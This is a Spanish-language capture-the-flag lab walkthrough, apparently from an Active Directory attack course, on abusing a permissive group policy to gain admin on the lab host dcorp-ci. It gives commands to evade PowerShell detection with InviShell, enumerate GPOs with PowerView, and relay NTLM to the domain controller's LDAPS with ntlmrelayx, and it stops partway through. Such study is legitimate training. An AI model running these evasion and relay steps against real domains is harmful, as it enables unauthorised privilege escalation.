
### Tareas
- [ ] Abusar de una Politica de grupo demasiado permisiva para obtener acceso de administrador en *dcorp-ci*

**Flag 9 Nombre del atributo de la directiva del grupo que se modifica**


## Abusar de una política de grupos
Primero deberemos de ejecutar *InviShell* para poder eludir las detecciones de PowerShell y poder ejecutar este de forma mas sigilosa
```shell
.\InviShell\RunWithRegistryNonAdmin.bat  
```

Y después podremos ejecutar *PowerView*
```shell
. .\PowerView.ps1 
```

### Enumeración de políticas vinculadas al equipo *DCORP-CI*
```shell
Get-DomainGPO -ComputerIdentity DCORP-CI
```

Viendo que pertenece a la política *DevOps*, para confirmar la existencia de esta politica
```shell
Get-DomainGPO -Identity 'DevOps Policy'
```

A continuación necesitaremos ejecutar *ntlmrelayx* usando *WSL* para poder retrasmitir el servicio LDAP en el controlador de dominio
```shell
sudo ntlmrelayx.py -t ldaps://<IP_DC> -wh <IP_VM> --http-port '80,8080' -i --no-smb-server
```

PAra obtener la IP del controlador del dominio deberemos de hacer ping a este
```shell
ping DOLLARCORP.MONEYCORP.LOCAL
```

